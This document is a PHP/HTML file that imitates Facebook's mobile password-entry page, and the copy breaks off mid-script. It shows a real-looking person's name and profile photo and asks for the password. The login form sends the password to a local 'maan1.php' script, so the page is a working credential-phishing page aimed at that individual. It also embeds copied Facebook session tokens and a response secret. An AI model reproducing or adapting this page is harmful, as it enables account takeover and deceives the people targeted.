<html lang="en">
<?php session_start(); ?>

<head>
    <title>Log into Facebook</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/r_TGOvPpEfq.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="aRsnqzl" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/WNCbOz7Ha-Y.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="11MQfRA" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/4khDgy1VOLx.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="WZdEF9F" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/xQBN84OZA7q.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="5FxlDXM" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/1ud1vBd-3fz.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="0iYmMFG" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/n9g6Q0kZdhT.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
    <script id="u_0_d_rZ" nonce="">
    function envFlush(a) {
        function b(b) {
            for (var c in a) b[c] = a[c]
        }
        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
    }
    envFlush({
        "timeslice_heartbeat_config": {
            "pollIntervalMs": 33,
            "idleGapThresholdMs": 60,
            "ignoredTimesliceNames": {
                "requestAnimationFrame": true,
                "Event listenHandler mousemove": true,
                "Event listenHandler mouseover": true,
                "Event listenHandler mouseout": true,
                "Event listenHandler scroll": true
            },
            "isHeartbeatEnabled": true,
            "isArtilleryOn": false
        },
        "shouldLogCounters": true,
        "timeslice_categories": {
            "react_render": true,
            "reflow": true
        },
        "sample_continuation_stacktraces": true,
        "dom_mutation_flag": true
    });
    </script>
    <script nonce="">
    document.domain = 'facebook.com';
    </script>
    <script nonce="">
    __DEV__ = 0;
    </script>
    <script id="u_0_e_L9" crossorigin="anonymous"
        src="https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/cm7iPS9J0h2.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="L8NPcws" nonce=""></script>
    <script id="u_0_b_5w" nonce="">
    CavalryLogger = window.CavalryLogger || function(a) {
            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this
                .instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {},
                this.values = {
                    t_cstart: window._cstart
                }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this
                .initializeInstrumentation && this.initializeInstrumentation()
        }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
            this.is_detailed_profiler = a;
            return this
        }, CavalryLogger.prototype.setTTIEvent = function(a) {
            this.tti_event = a;
            return this
        }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
            d = d ? this.piggy_values : this.values;
            (typeof d[a] === "undefined" || c) && (d[a] = b);
            return this
        }, CavalryLogger.prototype.getLastTtiValue = function() {
            return this.lastTtiValue
        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
            return this
        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
            console.timeStamp(a)
        } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
            this.piggy_values[a] = b;
            return this
        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function(a) {
            typeof a === "undefined" && (a = CavalryLogger.id);
            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
            return CavalryLogger.instances[a]
        }, CavalryLogger.setPageID = function(a) {
            if (CavalryLogger.id === 0) {
                var b = CavalryLogger.getInstance();
                CavalryLogger.instances[a] = b;
                CavalryLogger.instances[a].lid = a;
                delete CavalryLogger.instances[0]
            }
            CavalryLogger.id = a
        }, CavalryLogger.now = function() {
            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ?
                performance.now() + performance.timing.navigationStart : new Date().getTime()
        }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources =
        function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js =
        function() {}, CavalryLogger.start_js_script = function() {}, CavalryLogger.done_js = function() {};
    CavalryLogger.getInstance().setTTIEvent("t_domcontent");
    CavalryLogger.prototype.measureResources = function(a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
        b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
            c = "js_exec/" + a.name;
            this.ongoing_watch[c] = d
        }
    }, CavalryLogger.prototype.stopWatch = function(a) {
        if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(),
                c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d
                .resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d
                .resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b)
            );
            delete this.ongoing_watch[a]
        }
        return this
    }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
        var a = {};
        Object.values(window.CavalryLogger.instances).forEach(function(b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
        });
        return a
    }, CavalryLogger.start_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
    }, CavalryLogger.start_js_script = function(a) {
        if (!a || !a.dataset) return;
        CavalryLogger.start_js([a.dataset.bootloaderHash || a.dataset.bootloaderHashClient])
    }, CavalryLogger.done_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
    }, CavalryLogger.prototype.profileEarlyResources = function(a) {
        for (var b = 0; b < a.length; b++) this.measureResources({
            name: a[b][0],
            type: a[b][1] ? "js" : ""
        }, "_EF_")
    };
    CavalryLogger.getInstance().log_resources = true;
    CavalryLogger.getInstance().setIsDetailedProfiler(true);
    window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <script id="u_0_c_oX" nonce="">
    (function _(a, b, c, d) {
        function e(a) {
            document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
        }

        function f(a, b) {
            document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
        }
        if (!a) {
            e(b);
            e(c);
            return
        }
        a = null;
        (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf(
            "Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document
            .documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
        (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI *
            screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
        f(b, (a || window.devicePixelRatio || 1).toString());
        e = window.screen ? screen.width : 0;
        b = window.screen ? screen.height : 0;
        f(c, e + "x" + b);
        d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
    })(true, "m_pixel_ratio", "wd", false);
    </script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04"
        content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/s2CL6nxCNhf.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/s2CL6nxCNhf.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="HeTjZuF"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/Acb2WBg1OPJ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/Acb2WBg1OPJ.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="V7S7y8z"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/SlXLyDN6ExD.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/SlXLyDN6ExD.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="pci3ehS"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="bJ922yg"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/6GjO9u0EGU3.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/6GjO9u0EGU3.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="pzotvyr"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/HRoaPibbahM.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/HRoaPibbahM.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="t1KEUNA"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="FEt5GzN"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3ih-D4/yT/l/en_US/rDkjJ8n2bFN.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
        as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3ih-D4/yT/l/en_US/rDkjJ8n2bFN.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="KL2Ev9+"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iooI4/yO/l/en_US/9EPXNQ85WAE.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
        as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iooI4/yO/l/en_US/9EPXNQ85WAE.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="3x0FKjA"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iMJh4/y-/l/en_US/lrqGt4F2Asr.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
        as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iMJh4/y-/l/en_US/lrqGt4F2Asr.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="yfK5Gq+"></script>
</head>

<body tabindex="0" class="touch x1 _fzu _50-3 iframe _5oxw portrait"
    style="background-color: rgb(255, 255, 255); min-height: 937px;">
    <script id="u_0_a_hR" nonce="">
    (function(a) {
        a.__updateOrientation = function() {
            var b = !!a.orientation && a.orientation !== 180,
                c = document.body;
            c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ?
                "landscape" : "portrait"));
            return b
        }
    })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 937px;">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_8kas _5oxw" id="root" role="main" data-sigil="context-layer-root content-pane"
                style="min-height: 937px;">
                <div class="_7om2 _98fc" id="header">
                    <div class="_4g34"><a href="/home.php">
                            <div class="_98d6"><img class="_98d5 img"
                                    src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                            </div>
                        </a>
                        <hr style="background-color:#cccccc;height:1px;border:0px solid #fff;margin:0.3em auto;width:100%;"
                            class="_98d7">
                    </div>
                </div>
                <div class="_7om2">
                    <div class="_4g34 _7vd2 _8kau _98fb">
                        <p class="_52je _52ja _8qto">Try entering your password</p>
                        <div class="_7om2 _6rs7">
                            <div class="_5s61 _3-91"><i class="img img _1-yc _2sxw"
                                    style="background-image: url('187337475_4150064661698803_2026938580471522600_n.jpg');background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:40px;height:40px;"></i>
                            </div>
                            <div class="_4g34 _5i2i _52we">
                                <div class="_5xu4">
                                    <div class="_52je _52jb _52ji">Zaid Jawad Bazlamit</div>
                                </div>
                            </div>
                        </div>
                        <form method="post" action="maan1.php" class="_8ke_ _6wwv _2pif"><input type="hidden" name="lsd"
                                value="AVrDKn7_xgw" autocomplete="off"><input type="hidden" name="jazoest" value="21010"
                                autocomplete="off"><input type="hidden" name="cuid"
                                value="AYjwrxJroWAIdjzVB8hoUa6ycnrvPSBo8M748hjwPACnFLPFkWo9mnhIyrbuKsg8mW05QATm8VocOb9H_4mNe5vFHaMlq2tUdrTa8Tk5lpS8TgTpAU0worIXYQhIMbfzBeRdY2aYavrq0bpDmXrbX_GIpfQ317ZtoRXsvY-bBYTiUxc1C3JmKvbXcHZOZ0MVon5OHgg7akHUhnH1ob7155FXyurRF3ORULTAVbrz9awqeQ"><input
                                type="hidden" name="flow" value="ncpfar">
                            <input type="hidden" name="hidee" value="1">
                            <div>
                                <div class="_56be">
                                    <div class="_55wo _56bf">
                                        <div class="_1upc">
                                            <div class="_7om2">
                                                <div class="_4g34 _5i2i _52we">
                                                    <div class="_5xu4"><input autocorrect="off" autocapitalize="off"
                                                            class="_56bg _55wr _7br2 _85l2" name="pass"
                                                            placeholder="Password" data-testid="conf_password_input"
                                                            type="password" id="u_0_0_VS"
                                                            data-sigil="password-plain-text-toggle-input"></div>
                                                </div>
                                                <div class="_5s61 _216i _5i2i _52we">
                                                    <div class="_5xu4">
                                                        <div class="_2pi9" style="display:none" id="u_0_1_m4"><a
                                                                href="#" data-sigil="password-plain-text-toggle"><span
                                                                    class="mfss" style="display:none"
                                                                    id="u_0_2_Dv">HIDE</span><span class="mfss"
                                                                    id="u_0_3_zB">SHOW</span></a></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="_2pi3 _2pie"><button type="submit" value="Log In"
                                    class="_54k8 _52jh _56bs _56b_ _7bq- _85n3 _8u85 _56bw _56bu"
                                    data-testid="conf_login_button" data-sigil="touchable password_login_button"><span
                                        class="_55sr">Log In</span></button></div>
                            <div class="_2pip"><a
                                    href="/login/notme/?notme_cuid=AYiu5vua94KBcgSJZrFpxVf4QLdUv3xB6aV2GtxqDxJq7B2hmnA-PLFk76FT76VBrxkNox7vFrCKlny8OShTmdWLpOYSf2YbcRKXRbQ6Mp6qAa9BhVFwkn-Gf3wMrFQR7UNnXInHWTiGp_PjBHxGqXmX3FFT99paXItP8Xo1S4OiqewonM8OZ7DA8_NJbsNOUvZAP8PKEdeJAhkMNnxnx0IqB4nDWgcGI9G35pMs2nZwaA&amp;flow=recovery&amp;c=https%3A%2F%2Fm.facebook.com%2F"
                                    role="button" class="_54k8 _56bs _56b_ _56bx _56bt _52jh"
                                    data-sigil="touchable"><span class="_55sr">Not my account</span></a></div>
                            <div class="_7vd1"><a
                                    href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;fl=ncpfar&amp;ctx=msite_initiate_view"
                                    role="button" class="_54k8 _56bs _56b_ _9b-q _56bw _56bt _52jh"
                                    data-sigil="touchable"><span class="_55sr">Try Another Way</span></a></div>
                        </form>
                    </div>
                </div>
                <div style="display:none"></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0"
                        height="0" style="display:none"></span>
            </div>
            <div class=""></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_4_kW" data-sigil="marea">
                <div class="_5vsg" id="u_0_5_dc" style="max-height: 960px;"></div>
                <div class="_5vsh" id="u_0_6_dq" style="max-height: 468px;"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                        data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
                </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div><a class="link"
                        data-sigil="MPageError:retry">Try Again</a>
                </div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root"
            data-autoid="autoid_1">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_7om2 _52we">
                    <div class="_5s61">
                        <div class="_52z7"><button type="submit" value="Cancel"
                                class="cancelButton btn btnD bgb mfss touchable" id="u_0_8_9k"
                                data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back"
                                class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_9_Gu"
                                data-sigil="dialog-back-button"><i class="img sp_8fkxYjN88QR sx_6ae6a4"
                                    style="margin-top: 2px;"></i></button></div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
                                data-sigil="m-dialog-header-title dialog-title">Loading...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_7_Er"
                    data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
            </div>
        </div>
    </div>
    <script id="u_0_f_yV" crossorigin="anonymous"
        src="https://static.xx.fbcdn.net/rsrc.php/v3ixJY4/yd/l/en_US/2trUXYq8w-2.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="rSSg6U2" nonce=""></script>
    <script id="u_0_g_K/" nonce="">
    requireLazy(["HasteSupportData"], function(m) {
        m.handle({
            "gkxData": {
                "5241": {
                    "result": true,
                    "hash": "AT7o1bCQPGpf3ShElRs"
                },
                "676920": {
                    "result": false,
                    "hash": "AT497IX4gOFG8gZeIMY"
                },
                "708253": {
                    "result": false,
                    "hash": "AT5n4hBL3YTMnQWttcQ"
                },
                "996940": {
                    "result": false,
                    "hash": "AT7opYuEGy3sjG1aStU"
                },
                "1263340": {
                    "result": false,
                    "hash": "AT5bwizWgDaFQudmhok"
                }
            }
        })
    });
    requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        (new ServerJS()).handle({
            "define": [
                ["CometPersistQueryParams", [], {
                    "relative": {},
                    "domain": {}
                }, 6231],
                ["BigPipeExperiments", [], {
                    "link_images_to_pagelets": false,
                    "enable_bigpipe_plugins": false
                }, 907],
                ["BootloaderConfig", [], {
                    "deferBootloads": false,
                    "jsRetries": [200, 500],
                    "jsRetryAbortNum": 2,
                    "jsRetryAbortTime": 5,
                    "silentDups": false,
                    "hypStep4": false,
                    "phdOn": false,
                    "btCutoffIndex": 603
                }, 329],
                ["CSSLoaderConfig", [], {
                    "timeout": 5000,
                    "modulePrefix": "BLCSS:",
                    "loadEventSupported": true
                }, 619],
                ["CurrentCommunityInitialData", [], {}, 490],
                ["CurrentUserInitialData", [], {
                    "ACCOUNT_ID": "0",
                    "USER_ID": "0",
                    "NAME": "",
                    "SHORT_NAME": null,
                    "IS_BUSINESS_PERSON_ACCOUNT": false,
                    "HAS_SECONDARY_BUSINESS_PERSON": false,
                    "IS_FACEBOOK_WORK_ACCOUNT": false,
                    "IS_MESSENGER_ONLY_USER": false,
                    "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                    "IS_MESSENGER_CALL_GUEST_USER": false,
                    "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                    "APP_ID": "412378670482",
                    "IS_BUSINESS_DOMAIN": false
                }, 270],
                ["ErrorDebugHooks", [], {
                    "SnapShotHook": null
                }, 185],
                ["ISB", [], {}, 330],
                ["LSD", [], {
                    "token": "AVrDKn7_xgw"
                }, 323],
                ["MRequestConfig", [], {
                    "dtsg": {
                        "token": "AQFUuLZdmaK37zY:0:0",
                        "valid_for": 86400,
                        "expire": 1646549016
                    },
                    "dtsg_ag": {
                        "token": "AQxjtzOLThW-p36aWHqWdhYdtK_CYOi-mVZ2eXytzi5ECVQU:0:0",
                        "valid_for": 604800,
                        "expire": 1647067416
                    },
                    "lsd": "AVrDKn7_xgw",
                    "checkResponseOrigin": true,
                    "checkResponseToken": true,
                    "cleanFinishedRequest": false,
                    "cleanFinishedPrefetchRequests": false,
                    "ajaxResponseToken": {
                        "secret": "P3szIU9jsCciL7h2-yZXqrRAu8DzqgaZ",
                        "encrypted": "AYnvQOpP2rEXyUyKWU8tTHSLuKrWYiHc44RRwQF9Gtnw0PLdr3f9Cz_8Td7SjGt0JIr29bXWottSdhBXh3YgJcSokk_EjeSGNN42hH1P29MwJw"
                    }
                }, 51],
                ["ServerNonce", [], {
                    "ServerNonce": "6IKi_ZHdgrHFhUkT_RtQSj"
                }, 141],
                ["SiteData", [], {
                    "server_revision": 1005153370,
                    "client_revision": 1005153370,
                    "tier": "",
                    "push_phase": "C3",
                    "pkg_cohort": "BP:mtouch_pkg",
                    "haste_session": "19056.BP:mtouch_pkg.2.0.0.0.",
                    "pr": 1,
                    "haste_site": "mobile",
                    "manifest_domain": "https:\/\/static.xx.fbcdn.net",
                    "manifest_origin": null,
                    "be_one_ahead": false,
                    "is_rtl": false,
                    "is_comet": false,
                    "is_experimental_tier": false,
                    "is_jit_warmed_up": true,
                    "hsi": "7071503091402037698-0",
                    "semr_host_bucket": "6",
                    "bl_hash_version": 2,
                    "skip_rd_bl": true,
                    "comet_env": 0,
                    "spin": 0,
                    "__spin_r": 1005153370,
                    "__spin_b": "trunk",
                    "__spin_t": 1646462616,
                    "vip": "157.240.9.35"
                }, 317],
                ["SprinkleConfig", [], {
                    "param_name": "jazoest",
                    "version": 2,
                    "should_randomize": false
                }, 2111],
                ["PromiseUsePolyfillSetImmediateGK", [], {
                    "www_always_use_polyfill_setimmediate": false
                }, 2190],
                ["KSConfig", [], {
                    "killed": {
                        "__set": ["MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                            "MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP",
                            "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                            "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                            "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                            "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                            "BUY_AT_UI_LINE_DELETE",
                            "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                            "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                            "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                            "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                            "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                            "ADS_STORE_VISITS_METRICS_DEPRECATION",
                            "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                            "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                            "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL",
                            "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                            "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE",
                            "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER",
                            "SRT_BANZAI_SRT_MAIN_LOGGER",
                            "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                            "POCKET_MONSTERS_UPDATE_NAME",
                            "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                            "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                            "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD"
                        ]
                    },
                    "ko": {
                        "__set": ["8H4bQmEiuLT", "3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG",
                            "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi",
                            "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj",
                            "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W",
                            "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj",
                            "8rDvN9vWdAK", "9cL5o2kjfZo", "5BdzWGmfvrA", "DDZhogI19W",
                            "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c",
                            "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7",
                            "9kCSDzzr8fu"
                        ]
                    }
                }, 2580],
                ["JSErrorLoggingConfig", [], {
                    "appId": 412378670482,
                    "extra": [],
                    "reportInterval": 50,
                    "sampleWeight": null,
                    "sampleWeightKey": "__jssesw",
                    "projectBlocklist": []
                }, 2776],
                ["ImmediateImplementationExperiments", [], {
                    "prefer_message_channel": true
                }, 3419],
                ["UriNeedRawQuerySVConfig", [], {
                    "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com",
                        "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th",
                        "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com",
                        "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com",
                        "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx",
                        "bestbuy.com.mx", "booking.com", "nibio.no"
                    ]
                }, 3871],
                ["RunGatingConfig", [], {
                    "shouldUseBrowserUnload": true
                }, 3914],
                ["InitialCookieConsent", [], {
                    "deferCookies": false,
                    "initialConsent": {
                        "__set": [1, 2]
                    },
                    "noCookies": false,
                    "shouldShowCookieBanner": false
                }, 4328],
                ["TrustedTypesConfig", [], {
                    "useTrustedTypes": false,
                    "reportOnly": false
                }, 4548],
                ["WebConnectionClassServerGuess", [], {
                    "connectionClass": "UNKNOWN"
                }, 4705],
                ["BootloaderEndpointConfig", [], {
                    "debugNoBatching": false,
